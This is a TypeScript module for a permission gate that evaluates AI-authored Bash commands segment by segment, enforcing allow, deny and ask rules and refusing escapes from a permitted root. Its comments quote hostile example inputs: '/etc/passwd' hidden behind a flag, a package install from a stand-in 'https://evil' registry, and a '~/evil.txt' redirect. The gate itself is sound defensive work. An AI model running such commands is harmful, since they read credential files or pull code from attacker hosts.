/**
 * Per-segment evaluation of a model-authored Bash command (spec §4 US-005).
 *
 * Precedence, fixed and order-independent within a stage (spec R6 + US-005.3):
 *   1. the non-string / empty-command guards
 *   2. ANY segment matches deny   -> deny the whole call (breach false)
 *   3. payload checks per segment -> DENIED_FLAGS, containment, redirects, cd (breach as today)
 *   4. the lexer refused the command -> the escalatable lexical refusal
 *   5. EVERY segment must match an allow rule, else the escalatable grant miss
 *   6. ANY segment matches ask    -> ask
 * `escalatable: true` is produced at the two Category A sites above (4 and 5)
 * plus the one payload refusal the gate also cannot adjudicate: an
 * option-shaped `cd` (`cd -`, `cd -P dir`), whose target sits in a slot this
 * reader does not parse (step 3 -- see `checkPayload`). Every OTHER payload
 * denial is affirmatively out of bounds and non-escalatable, so an
 * out-of-bounds command never reaches the human on a later grant miss or
 * refusal. On a refused command the deny and payload checks run over the
 * lexer's `prefix` -- the part before the unreadable construct -- because that
 * is the part a deny rule or a containment breach can still name.
 * Ask is evaluated LAST so it can never grant: an ungranted command that
 * matches an ask rule is a plain denial, not an approval prompt (the same
 * rule the path and argv branches follow in policy.ts).
 *
 * Containment is INJECTED (`resolvePath`), not imported: `policy.ts` imports
 * this module, so importing `resolveWithin` back would be a cycle. The single
 * owner of the root boundary and the `.git/` refusal therefore remains `policy.ts`.
 */

import type { BashSegment, BashToken } from "@/permissions";
import { lexBashCommand } from "@/permissions";
import { cdTargetsFor, nextWorkingDirectories } from "./bash-cwd";
import { deniedFlag } from "./exec-guard";
import type { CompiledEntry, CompiledPattern } from "./policy-match";

export type BashCheck =
  | { readonly kind: "allow" }
  | { readonly kind: "ask"; readonly rule: string }
  | {
      readonly kind: "deny";
      readonly reason: string;
      readonly breach: boolean;
      /**
       * True when the gate could not ADJUDICATE the command — the lexer refused
       * it, no allow rule covered a segment, or a `cd` target is option-shaped
       * and sits in a slot this reader does not parse. False when the command
       * is affirmatively out of bounds (root escape, `.git/`, a denied flag, an
       * explicit deny rule, a `cd` target outside the root). Only the former
       * may be escalated to the ask tier by `escalate` mode; escalating the
       * latter would dissolve the `breach` signal into an approval prompt. See
       * ADR-030.
       */
      readonly escalatable: boolean;
    };

export interface BashCheckArgs {
  readonly tool: string;
  readonly command: unknown;
  /** The stage's compiled ALLOW entry for this tool. */
  readonly grant: CompiledEntry;
  readonly denyEntry?: CompiledEntry;
  readonly askEntry?: CompiledEntry;
  /** Absolute resolved path, or null when the candidate escapes the root or
   * enters `.git/`. Supplied by policy.ts (see the header). */
  /** Resolves a candidate from an effective shell working directory. */
  readonly resolvePath: (candidate: string, cwd: string) => string | null;
  /** The shell's initial working directory. */
  readonly initialPath: string;
}

function deny(reason: string, breach = false, escalatable = false): BashCheck {
  return { kind: "deny", reason, breach, escalatable };
}

/**
 * Prefix match, token-wise, with the two rules Exec's `matchesArgvPattern`
 * does not have:
 *
 * - a TRAILING `*` is OPTIONAL, because the spec requires `Bash(bun test *)`
 *   to admit bare `bun test` as well as `bun test src/x.test.ts`;
 * - an OPAQUE token (one that contained `$`-expansion) can match only a bare
 *   `*` pattern token during grant evaluation. Payload validation then refuses
 *   it, because its runtime value cannot be contained safely.
 */
function matchesTokens(patternTokens: readonly CompiledPattern[], tokens: readonly BashToken[]): boolean {
  const required =
    patternTokens.length > 0 && patternTokens[patternTokens.length - 1]?.source === "*"
      ? patternTokens.slice(0, -1)
      : patternTokens;
  if (tokens.length < required.length) return false;
  return required.every((pattern, index) => {
    const token = tokens[index] as BashToken;
    if (token.opaque && pattern.source !== "*") return false;
    return pattern.re.test(token.text);
  });
}

function matchesSegment(entry: CompiledEntry, segment: BashSegment): boolean {
  if (entry.unconditional) return true;
  return entry.argvPatterns.some((tokens) => matchesTokens(tokens, segment.tokens));
}

/** `Tool` for an unconditional entry, else `Tool(<the pattern that matched>)`. */
function ruleExpr(tool: string, entry: CompiledEntry, segment?: BashSegment): string {
  if (entry.unconditional) return tool;
  const sources = entry.raw.filter((pattern) => pattern !== "*");
  const index =
    segment === undefined ? -1 : entry.argvPatterns.findIndex((tokens) => matchesTokens(tokens, segment.tokens));
  const matched = index === -1 ? undefined : sources[index];
  return `${tool}(${matched ?? entry.raw.join(", ")})`;
}

function render(segment: BashSegment): string {
  return segment.tokens.map((token) => token.text).join(" ");
}

/**
 * The filesystem path a word can actually address, once a prefix is stripped.
 *
 * A word carrying a separator is not necessarily the path: `--output=/etc/passwd`
 * and `-o/etc/passwd` both hide one behind a flag, and `resolveWithin` reads the
 * whole word as a RELATIVE path (`<root>/--output=/etc/passwd`), so the escape
 * lives in the embedded value while the raw word looks contained. Extract it:
 *
 *   --output=/etc/passwd -> /etc/passwd   (value after an `=` that precedes a separator)
 *   -o/etc/passwd        -> /etc/passwd   (from the first separator on a `-`-led word)
 *   ../etc/passwd        -> ../etc/passwd (no prefix: the word itself)
 *   link                 -> link          (no prefix: a bare word can be a symlink out)
 *
 * The last line is why this runs on EVERY non-opaque word rather than only the
 * separator-bearing ones: a bare `link` can be a symlink to a target outside the
 * root, and a word that does not exist safely joins under the root because
 * `realOrRaw` walks up to the nearest existing ancestor and never throws.
 */
function containmentTarget(text: string): string {
  // The value after `=` is the target whether or not it contains a separator:
  // `--output-dir=..` escapes just as `--output-dir=../x` does, and reading the
  // whole word instead resolves `<root>/--output-dir=..` -- a literal segment
  // that is trivially inside the root while the command receives `..`.
  const equals = text.indexOf("=");
  const slash = text.indexOf("/");
  if (equals !== -1 && (slash === -1 || equals < slash)) return text.slice(equals + 1);
  if (slash === -1) return text;
  if (text.startsWith("-")) return text.slice(slash);
  return text;
}

function hasUnmodelledExpansion(text: string): boolean {
  return ["*", "?", "[", "]", "{", "}"].some((character) => text.includes(character));
}

function resolveAll(args: BashCheckArgs, candidate: string, cwd: readonly string[]): readonly string[] | undefined {
  const resolved = cwd.map((directory) => args.resolvePath(candidate, directory));
  return resolved.every((path): path is string => path !== null) ? resolved : undefined;
}

function checkPayload(
  args: BashCheckArgs,
  segment: BashSegment,
  cwd: readonly string[],
): { readonly refusal?: BashCheck; readonly cdTargets?: readonly string[] } {
  const words = segment.tokens.map((token) => token.text);

  // Same list and normalizer as Exec: a prefix grant gates the verb, never the
  // payload, so `bun add x --registry https://evil` satisfies `bun add *`.
  const flag = deniedFlag(words);
  if (flag !== undefined) return { refusal: deny(`flag ${flag} is not permitted in a Bash command`) };

  for (const token of segment.tokens) {
    if (token.opaque || hasUnmodelledExpansion(token.text)) {
      return { refusal: deny(`token "${token.text}" depends on shell expansion this gate cannot resolve`) };
    }
    const target = containmentTarget(token.text);
    if (target.startsWith("~")) {
      return {
        refusal: deny(
          `token "${token.text}" addresses "${target}", which starts with "~" and depends on expansion this gate cannot resolve`,
        ),
      };
    }
    if (resolveAll(args, target, cwd) === undefined) {
      return {
        refusal: deny(
          `token "${token.text}" addresses "${target}", which resolves outside the permitted root, or into .git/`,
          true,
        ),
      };
    }
  }

  let cdTargets: readonly string[] | undefined;
  // `cd` moves every LATER segment's frame of reference, so its target is
  // containment-checked even when it carries no separator (`cd ..`). The
  // resolution and the WHY-unmodellable reasoning are shared with the raw
  // screen via `cdTargetsFor` (bash-cwd.ts). Gated denies every unmodelled
  // case, because containment is the whole point of this mode.
  const cdResult = cdTargetsFor(segment, cwd, args.resolvePath);
  switch (cdResult.kind) {
    case "no-target":
      return { refusal: deny("`cd` with no target is refused") };
    case "option-shaped":
      // `cd -`, `cd -P dir`: the path sits in a slot this reader does not
      // parse, so the gate CANNOT ADJUDICATE where the shell lands. That is
      // Category A, like the lexer's own refusal -- not the affirmative
      // out-of-bounds of a `cd` target that resolves outside the root, which
      // stays a non-escalatable breach below. Marking it escalatable keeps a
      // refusal the gate cannot model from preempting the (equally
      // unadjudicable) grant miss when the reorder runs payload checks first.
      return {
        refusal: deny(`cd target "${cdResult.text}" is option-shaped, and this gate does not model it`, false, true),
      };
    case "opaque":
    case "unresolved":
      return { refusal: deny(`cd target "${cdResult.text}" is not inside the permitted root`, true) };
    case "resolved":
      cdTargets = cdResult.targets;
      break;
    case "not-cd":
      break;
  }

  for (const redirect of segment.redirects) {
    if (redirect.opaque) {
      return { refusal: deny(`redirect target "${redirect.target}" depends on expansion this gate cannot resolve`) };
    }
    // Redirect targets are NOT in `segment.tokens`, and `resolveWithin` does not
    // expand `~`: it would read `~/evil.txt` as the literal `<root>/~/evil.txt`
    // and wave it through, while `/bin/sh` writes to `$HOME/evil.txt`. Mirrors
    // the `~` guard on the token loop above.
    if (redirect.target.startsWith("~")) {
      return {
        refusal: deny(
          `redirect target "${redirect.target}" starts with "~", which depends on expansion this gate cannot resolve`,
        ),
      };
    }
    if (hasUnmodelledExpansion(redirect.target)) {
      return {
        refusal: deny(`redirect target "${redirect.target}" depends on shell expansion this gate cannot resolve`),
      };
    }
    if (resolveAll(args, redirect.target, cwd) === undefined) {
      return { refusal: deny(`redirect target "${redirect.target}" resolves outside the permitted root`, true) };
    }
  }

  return { cdTargets };
}

export function checkBashCommand(args: BashCheckArgs): BashCheck {
  const { command, tool } = args;
  if (typeof command !== "string") return deny(`"command" must be a string`);
  if (command.trim() === "") return deny(`"command" must not be empty`);

  const lexed = lexBashCommand(command);
  // On a refusal the gate still runs its deny and payload checks -- over the
  // lexable prefix, the part before the unreadable construct. The prefix is
  // empty when the refusal preceded any completed word, leaving the checks a
  // no-op and the escalatable lexical refusal intact (Category A).
  const segments = lexed.kind === "ok" ? lexed.segments : lexed.prefix;

  for (const segment of segments) {
    if (args.denyEntry !== undefined && matchesSegment(args.denyEntry, segment)) {
      return deny(
        `${tool} segment "${render(segment)}" is denied for this stage by rule ${ruleExpr(tool, args.denyEntry, segment)}`,
      );
    }
  }

  let cwd: readonly string[] = [args.initialPath];
  for (const segment of segments) {
    const result = checkPayload(args, segment, cwd);
    if (result.refusal !== undefined) return result.refusal;
    cwd = nextWorkingDirectories(segment, cwd, result.cdTargets);
  }

  if (lexed.kind === "refused") {
    return deny(
      `command contains ${lexed.construct}, which cannot be analysed and is therefore refused -- ` +
        "rewrite it without that construct, or use a structured tool",
      false,
      true,
    );
  }

  for (const segment of segments) {
    if (args.grant.unconditional || matchesSegment(args.grant, segment)) continue;
    const granted = args.grant.raw.filter((pattern) => pattern !== "*").join(", ");
    const alternatives = granted === "" ? "no command forms are granted for this stage" : `granted forms: ${granted}`;
    return deny(`${tool} is not granted "${render(segment)}" -- ${alternatives}`, false, true);
  }

  for (const segment of segments) {
    if (args.askEntry !== undefined && matchesSegment(args.askEntry, segment)) {
      return { kind: "ask", rule: ruleExpr(tool, args.askEntry, segment) };
    }
  }

  return { kind: "allow" };
}
